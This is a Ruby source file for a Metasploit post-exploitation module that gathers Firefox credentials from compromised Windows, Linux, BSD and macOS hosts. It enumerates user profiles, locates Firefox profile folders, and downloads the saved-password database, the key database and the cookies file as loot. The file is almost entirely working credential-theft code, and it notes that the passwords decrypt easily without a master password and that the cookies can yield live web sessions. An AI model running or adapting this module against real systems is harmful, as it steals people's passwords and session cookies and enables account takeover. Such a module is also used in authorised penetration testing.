##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Windows::UserProfiles

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Multi Gather Firefox Signon Credential Collection',
			'Description'    => %q{
					This module will collect credentials from the Firefox web browser if it is
				installed on the targeted machine. Additionally, cookies are downloaded. Which
				could potentially yield valid web sessions.

				Firefox stores passwords within the signons.sqlite database file. There is also a
				keys3.db file which contains the key for decrypting these passwords. In cases where
				a Master Password has not been set, the passwords can easily be decrypted using
				third party tools. If a Master Password was used the only option would be to
				bruteforce.
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['bannedit'],
			'Platform'       => ['win', 'linux', 'bsd', 'unix', 'osx'],
			'SessionTypes'   => ['meterpreter', 'shell' ]
		))
		#TODO
		# - add support for decrypting the passwords without a Master Password
		# - Collect cookies.
	end

	def run
		paths = []
		print_status("Determining session platform and type...")
		case session.platform
		when /unix|linux|bsd/
			@platform = :unix
			paths = enum_users_unix
		when /osx/
			@platform = :osx
			paths = enum_users_unix
		when /win/
			if session.type != "meterpreter"
				print_error "Only meterpreter sessions are supported on windows hosts"
				return
			end

			grab_user_profiles().each do |user|
				next if user['AppData'] == nil
				dir = check_firefox(user['AppData'])
				if dir
					paths << dir
				end
			end
		else
			print_error("Unsupported platform #{session.platform}")
			return
		end
		if paths.nil?
			print_error("No users found with a Firefox directory")
			return
		end

		download_loot(paths.flatten)
	end

	def enum_users_unix
		id = whoami
		if id.nil? or id.empty?
			print_error("This session is not responding, perhaps the session is dead")
		end

		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end

		if got_root?
			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/root\n"
		else
			print_status("We do not have root privileges")
			print_status("Checking #{id} account for Firefox")
			if @platform == :osx
				firefox = session.shell_command("ls #{home}#{id}/Library/Application\\ Support/Firefox/Profiles/").gsub(/\s/, "\n")
			else
				firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
			end

			firefox.each_line do |profile|
				profile.chomp!
				next if profile =~ /No such file/i

				if profile =~ /\.default/
						print_status("Found Firefox Profile for: #{id}")
						if @platform == :osx
							return [home + id + "/Library/Application\\ Support/Firefox/Profiles/" + profile + "/"]
						else
							return [home + id + "/.mozilla/" + "firefox/" + profile + "/"]
						end
				end
			end
			return
		end

		# we got root check all user dirs
		paths = []
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = home + dir + "/.mozilla/firefox/" if dir !~ /root/
			if dir =~ /root/
				dir += "/.mozilla/firefox/"
			end

			print_status("Checking for Firefox Profile in: #{dir}")

			stat = session.shell_command("ls #{dir}")
			if stat =~ /No such file/i
				print_error("Mozilla not found in #{dir}")
				next
			end
			stat.gsub!(/\s/, "\n")
			stat.each_line do |profile|
				profile.chomp!
				if profile =~ /\.default/
					print_status("Found Firefox Profile in: #{dir+profile}")
					paths << "#{dir+profile}"
				end
			end
		end
		return paths
	end

	def check_firefox(path)
		paths = []
		path = path + "\\Mozilla\\"
		print_status("Checking for Firefox directory in: #{path}")

		stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
		if !stat
			print_error("Firefox not found")
			return
		end

		session.fs.dir.foreach(path) do |fdir|
			if fdir =~ /Firefox/i and @platform == :windows
				paths << path + fdir + "Profiles\\"
				print_good("Found Firefox installed")
				break
			else
				paths << path + fdir
				print_status("Found Firefox installed")
				break
			end
		end

		if paths.empty?
			print_error("Firefox not found")
			return
		end

		print_status("Locating Firefox Profiles...")
		print_line("")
		path += "Firefox\\Profiles\\"

		# we should only have profiles in the Profiles directory store them all
		begin
			session.fs.dir.foreach(path) do |pdirs|
				next if pdirs == "." or pdirs == ".."
				print_good("Found Profile #{pdirs}")
				paths << path + pdirs
			end
		rescue
			print_error("Profiles directory missing")
			return
		end

		if paths.empty?
			return nil
		else
			return paths
		end
	end

	def download_loot(paths)
		loot = ""
		paths.each do |path|
			print_status(path)
			profile = path.scan(/Profiles[\\|\/](.+)$/).flatten[0].to_s
			if session.type == "meterpreter"
				session.fs.dir.foreach(path) do |file|
					if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
						print_good("Downloading #{file} file from: #{path}")
						file = path + "\\" + file
						fd = session.fs.file.new(file)
						begin
							until fd.eof?
								data = fd.read
								loot << data if not data.nil?
							end
						rescue EOFError
						ensure
							fd.close
						end

						ext = file.split('.')[2]
						if ext == "txt"
							mime = "plain"
						else
							mime = "binary"
						end
						file = file.split('\\').last
						store_loot("ff.profile.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
					end
				end
			end
			if session.type != "meterpreter"
				files = session.shell_command("ls #{path}").gsub(/\s/, "\n")
				files.each_line do |file|
					file.chomp!
					if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
						print_good("Downloading #{file}\\")
						data = session.shell_command("cat #{path}#{file}")
						ext = file.split('.')[2]
						if ext == "txt"
							mime = "plain"
						else
							mime = "binary"
						end
						file = file.split('/').last
						store_loot("ff.profile.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
					end
				end
			end
		end
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end

	def whoami
		if @platform == :windows
			return session.fs.file.expand_path("%USERNAME%")
		else
			return session.shell_command("whoami").chomp
		end
	end
end
